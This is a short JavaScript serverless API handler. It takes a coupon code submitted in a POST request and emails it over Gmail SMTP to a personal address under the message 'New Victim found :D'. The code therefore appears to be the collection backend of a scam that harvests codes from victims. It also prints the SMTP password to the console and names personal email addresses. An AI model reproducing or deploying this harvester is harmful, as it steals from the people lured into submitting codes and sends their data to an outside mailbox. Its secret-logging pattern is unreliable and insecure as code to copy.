import {SMTPClient} from "emailjs";

export default async function handler(request, response) {

  if (request.method !== "POST") {
    return response.status(400).send({message: "Only POST"})
  }

  console.log("Pwd: " + process.env.PAWD)

  const couponCode = request.query.couponCode

  const client = new SMTPClient({
    user: "hikari.dev.cs@gmail.com",
    password: process.env.PAWD,
    host: "smtp.gmail.com",
    ssl: true
  })

  try {
    await client.sendAsync({
      text: "New Victim found :D | " + couponCode,
      from: "hikari.dev.cs@gmail.com",
      to: "erikson.murrugarra@gmail.com",
      subject: "New Feliperoo code: " + couponCode
    })
  }
  catch(e) {
    console.log(e)
    return response.status(400).json({procesed: false})
  }

  console.log("Processed coupon: " + couponCode)
  return response
    .status(200)
    .json({processed: true})


}
